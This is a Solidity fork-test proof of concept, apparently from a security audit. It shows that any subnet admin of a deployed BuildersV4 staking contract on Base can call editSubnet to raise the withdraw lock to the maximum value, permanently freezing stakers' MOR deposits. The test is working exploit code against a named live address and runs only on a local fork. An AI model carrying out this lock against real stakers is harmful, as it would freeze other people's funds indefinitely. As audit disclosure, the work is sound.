// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IERC20Minimal {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IBuildersV4Minimal {
    struct Subnet {
        string name;
        address admin;
        uint128 unusedStorage1_V4Update;
        uint128 withdrawLockPeriodAfterDeposit;
        uint128 unusedStorage2_V4Update;
        uint256 minimalDeposit;
        address claimAdmin;
    }
    struct SubnetMetadata {
        string slug;
        string description;
        string website;
        string image;
    }

    function createSubnet(Subnet calldata subnet_, SubnetMetadata calldata metadata_) external;
    function editSubnet(bytes32 subnetId_, Subnet calldata newSubnet_) external;
    function deposit(bytes32 subnetId_, uint256 amount_) external;
    function withdraw(bytes32 subnetId_, uint256 amount_) external;
    function getSubnetId(string memory subnetName_) external view returns (bytes32);
    function subnets(bytes32 subnetId_)
        external
        view
        returns (
            string memory name,
            address admin,
            uint128 unused1,
            uint128 withdrawLockPeriodAfterDeposit,
            uint128 unused2,
            uint256 minimalDeposit,
            address claimAdmin
        );
    function usersData(address user, bytes32 subnetId_)
        external
        view
        returns (uint128 lastDeposit, uint128 unused1, uint256 deposited, uint256 unused2);
    function minimalWithdrawLockPeriod() external view returns (uint256);
}

/// @notice Auditor D — BuildersV4 `editSubnet` retroactive permanent withdraw lock.
/// @dev Fork test against DEPLOYED BuildersV4 on Base. No privileged accounts:
///      attacker/victim are fresh EOAs; only permissionless functions are used
///      (createSubnet is open to anyone, editSubnet is the subnet admin's own).
///      Live precondition (verified 2026-11-12): minimalWithdrawLockPeriod = 7 days,
///      subnetCreationFeeAmount = 0, totalDeposited = 2,945,944 MOR (~$2.30M),
///      contract holds the same MOR balance.
contract BuildersV4EditSubnetLockTest is Test {
    address constant BUILDERS_V4 = 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;

    uint256 constant PINNED_BLOCK = 56345262;

    address attacker = makeAddr("attackerSubnetAdmin");
    address victim = makeAddr("victimStaker");

    bytes32 subnetId;

    function setUp() public {
        vm.createSelectFork("https://mainnet.base.org", PINNED_BLOCK);
        vm.label(BUILDERS_V4, "BuildersV4");
        vm.label(MOR, "MOR");

        // Fund both parties with MOR (fork cheatcode; no live funds move).
        deal(MOR, attacker, 1_000 ether);
        deal(MOR, victim, 100_000 ether);

        // Attacker (unprivileged user) creates a subnet: admin == claimAdmin == self.
        IBuildersV4Minimal.Subnet memory s = IBuildersV4Minimal.Subnet({
            name: "AuditPoCSubnet",
            admin: attacker,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: 7 days,
            unusedStorage2_V4Update: 0,
            minimalDeposit: 1 ether,
            claimAdmin: attacker
        });
        IBuildersV4Minimal.SubnetMetadata memory m = IBuildersV4Minimal.SubnetMetadata({
            slug: "audit-poc",
            description: "PoC subnet",
            website: "",
            image: ""
        });
        vm.prank(attacker);
        IBuildersV4Minimal(BUILDERS_V4).createSubnet(s, m);
        subnetId = IBuildersV4Minimal(BUILDERS_V4).getSubnetId("AuditPoCSubnet");

        // Victim stakes 10,000 MOR into the attacker's subnet.
        vm.startPrank(victim);
        IERC20Minimal(MOR).approve(BUILDERS_V4, type(uint256).max);
        IBuildersV4Minimal(BUILDERS_V4).deposit(subnetId, 10_000 ether);
        vm.stopPrank();
    }

    function test_withdrawWorksBeforeLockIncrease_control() public {
        // Control: after the 7-day lock elapses, victim can withdraw.
        vm.warp(block.timestamp + 8 days);
        uint256 balBefore = IERC20Minimal(MOR).balanceOf(victim);
        vm.prank(victim);
        IBuildersV4Minimal(BUILDERS_V4).withdraw(subnetId, 1 ether);
        uint256 balAfter = IERC20Minimal(MOR).balanceOf(victim);
        assertEq(balAfter - balBefore, 1 ether, "control: withdraw should work pre-attack");
        console.log("CONTROL withdraw OK, victim MOR:", balAfter / 1 ether);
    }

    function test_subnetAdminPermanentlyLocksStakers() public {
        // --- Attack: subnet admin raises the withdraw lock to uint128.max. ---
        // editSubnet has NO deadline and NO upper bound on the lock (V3 only
        // allowed edits before pool start; V4 removed that guard entirely).
        IBuildersV4Minimal.Subnet memory s = IBuildersV4Minimal.Subnet({
            name: "AuditPoCSubnet",
            admin: attacker,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: type(uint128).max,
            unusedStorage2_V4Update: 0,
            minimalDeposit: 1 ether,
            claimAdmin: attacker
        });
        vm.prank(attacker);
        IBuildersV4Minimal(BUILDERS_V4).editSubnet(subnetId, s);

        (,,, uint128 lockAfter,,,) = IBuildersV4Minimal(BUILDERS_V4).subnets(subnetId);
        assertEq(lockAfter, type(uint128).max, "lock not raised");

        // --- Victim impact: withdraw reverts forever, funds stay in BuildersV4. ---
        uint256 victimDeposited = 10_000 ether;

        vm.warp(block.timestamp + 365 days);
        vm.prank(victim);
        vm.expectRevert();
        IBuildersV4Minimal(BUILDERS_V4).withdraw(subnetId, victimDeposited);

        vm.warp(block.timestamp + 100 * 365 days); // +100 years: still locked
        vm.prank(victim);
        vm.expectRevert();
        IBuildersV4Minimal(BUILDERS_V4).withdraw(subnetId, 1 ether);

        // Even a partial (dust) withdrawal is impossible.
        vm.prank(victim);
        vm.expectRevert();
        IBuildersV4Minimal(BUILDERS_V4).withdraw(subnetId, 1 wei);

        (,, uint256 stillDeposited,) = IBuildersV4Minimal(BUILDERS_V4).usersData(victim, subnetId);
        assertEq(stillDeposited, victimDeposited, "victim deposit must remain recorded");

        uint256 contractBal = IERC20Minimal(MOR).balanceOf(BUILDERS_V4);
        assertGe(contractBal, victimDeposited, "victim MOR must remain in BuildersV4");
        assertEq(IERC20Minimal(MOR).balanceOf(victim), 90_000 ether, "victim got nothing back");

        // Attacker gained nothing directly (pure lock, no theft) — the loss is
        // the victim's: 10,000 MOR (~$7,797 at live $0.77969/MOR) frozen forever.
        console.log("VICTIM LOCKED (MOR):", stillDeposited / 1 ether);
        console.log("BUILDERS_V4 MOR BALANCE:", contractBal / 1 ether);
        console.log("ATTACKER MOR (unchanged 1000):", IERC20Minimal(MOR).balanceOf(attacker) / 1 ether);
    }
}
